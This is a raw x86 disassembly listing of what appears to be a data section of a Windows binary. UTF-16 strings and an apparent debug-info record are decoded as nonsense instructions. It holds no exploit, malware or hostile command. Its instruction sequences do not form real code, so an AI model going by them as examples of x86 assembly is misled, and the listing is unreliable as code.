  433955:	dec    ebx
  433956:	pop    edi
  433957:	push   edi
  433958:	add    BYTE PTR [eax+0x0],bl
  43395b:	inc    edi
  43395c:	add    BYTE PTR [edx+0x0],al
  43395f:	pop    edi
  433960:	add    BYTE PTR [ebx],dh
  433962:	add    BYTE PTR [eax],bh
  433964:	add    BYTE PTR [ebx+0x0],cl
  433967:	xor    eax,0x33003500
  43396c:	add    BYTE PTR [eax],dh
  43396e:	add    BYTE PTR [edi+0x0],bl
  433971:	push   esp
  433972:	add    BYTE PTR [ebp+0x0],cl
  433975:	xor    BYTE PTR [eax],al
  433977:	add    BYTE PTR [eax],al
  433979:	inc    esi
  43397a:	add    BYTE PTR [eax+0x0],bl
  43397d:	xor    BYTE PTR [eax],al
  43397f:	pop    edi
  433980:	add    BYTE PTR [ecx],dh
  433982:	add    BYTE PTR [ebx+0x0],al
  433985:	xor    eax,0x5f003100
  43398a:	add    BYTE PTR [ecx+0x0],al
  43398d:	xor    eax,DWORD PTR [eax]
  43398f:	add    BYTE PTR [eax],al
  433991:	push   ebx
  433992:	add    BYTE PTR [ebx+0x0],dl
  433995:	dec    eax
  433996:	add    BYTE PTR [edi+0x0],bl
  433999:	push   esp
  43399a:	add    BYTE PTR [ebx+0x0],al
  43399d:	push   ebx
  43399e:	add    BYTE PTR [edx+0x0],dl
  4339a1:	pop    edi
  4339a2:	add    BYTE PTR [ecx+0x0],dl
  4339a5:	dec    edi
  4339a6:	add    BYTE PTR [edi+0x0],al
  4339a9:	push   ecx
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	pop    ecx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],cl
  4339b3:	dec    edi
  4339b4:	add    BYTE PTR [ebp+0x0],dl
  4339b7:	cmp    DWORD PTR [eax],eax
  4339b9:	pop    edi
  4339ba:	add    BYTE PTR [edx],dh
  4339bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4339c0:	add    BYTE PTR ds:0x47005f00,dh
  4339c6:	add    BYTE PTR ds:0x48000000,dh
  4339cc:	add    BYTE PTR [edx+0x0],cl
  4339cf:	push   eax
  4339d0:	add    BYTE PTR [edi+0x0],bl
  4339d3:	cmp    BYTE PTR [eax],al
  4339d5:	add    BYTE PTR ss:0x55004100,dh
  4339dc:	add    BYTE PTR [edi+0x0],bl
  4339df:	push   edx
  4339e0:	add    BYTE PTR [edi],dh
  4339e2:	add    BYTE PTR [ecx+0x0],cl
  4339e5:	add    BYTE PTR [eax],al
  4339e7:	inc    esp
  4339e8:	add    BYTE PTR [ecx+0x0],dl
  4339eb:	inc    edx
  4339ec:	add    BYTE PTR [edi+0x0],bl
  4339ef:	push   ecx
  4339f0:	add    BYTE PTR [ecx+0x0],bl
  4339f3:	dec    edi
  4339f4:	add    BYTE PTR [eax+0x0],dl
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	dec    edx
  4339fa:	add    BYTE PTR [ecx+0x0],dl
  4339fd:	inc    esp
  4339fe:	add    BYTE PTR [edi+0x0],bl
  433a01:	dec    edx
  433a02:	add    BYTE PTR [eax],dh
  433a04:	add    BYTE PTR [ecx],dh
  433a06:	add    BYTE PTR [ebx+0x0],dl
  433a09:	push   ecx
  433a0a:	add    BYTE PTR [ecx],dh
  433a0c:	add    BYTE PTR [edi+0x0],bl
  433a0f:	push   edi
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    BYTE PTR [ebx+0x0],cl
  433a15:	pop    edx
  433a16:	add    BYTE PTR [esi],dh
  433a18:	add    BYTE PTR [edi+0x0],bl
  433a1b:	inc    ebx
  433a1c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433a20:	add    BYTE PTR [edi+0x0],bl
  433a23:	push   edi
  433a24:	add    BYTE PTR [ebx],dh
  433a26:	add    BYTE PTR [esi+0x0],cl
  433a29:	push   ebp
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	dec    edx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],dl
  433a33:	aaa    
  433a34:	add    BYTE PTR [eax],bh
  433a36:	add    BYTE PTR [edi+0x0],bl
  433a39:	pop    eax
  433a3a:	add    BYTE PTR [edi+0x0],cl
  433a3d:	inc    edi
  433a3e:	add    BYTE PTR [edi+0x0],bl
  433a41:	xor    al,0x0
  433a43:	push   eax
  433a44:	add    BYTE PTR [ecx+0x0],cl
  433a47:	push   ebp
  433a48:	add    BYTE PTR [eax],al
  433a4a:	add    BYTE PTR [edi+0x0],dl
  433a4d:	push   esp
  433a4e:	add    BYTE PTR [ebx+0x0],cl
  433a51:	add    BYTE PTR [eax],al
  433a53:	add    BYTE PTR [edx+0x53],dl
  433a56:	inc    esp
  433a57:	push   ebx
  433a58:	push   0x4a
  433a5a:	mov    esp,0xf56fc943
  433a5f:	inc    esi
  433a60:	xchg   edx,eax
  433a61:	jno    0x433a71
  433a63:	sbb    BYTE PTR ds:0x1b35d496,cl
  433a69:	add    BYTE PTR [eax],al
  433a6b:	add    BYTE PTR [edx+edi*1+0x5c],dl
  433a6f:	jns    0x433ada
  433a71:	addr16 push edi
  433a73:	bound  bx,DWORD PTR [edx+0x45]
  433a77:	outs   dx,BYTE PTR ds:[esi]
  433a78:	pop    esp
  433a79:	je     0x433aee
  433a7b:	ja     0x433abe
  433a7d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a85:	js     0x433af6
  433a87:	jp     0x433af8
  433a89:	jns    0x433aef
  433a8b:	jp     0x433af5
  433a8d:	je     0x433af3
  433a8f:	jp     0x433af3
  433a91:	cs jo  0x433af8
  433a94:	bound  eax,QWORD PTR [eax]
	...
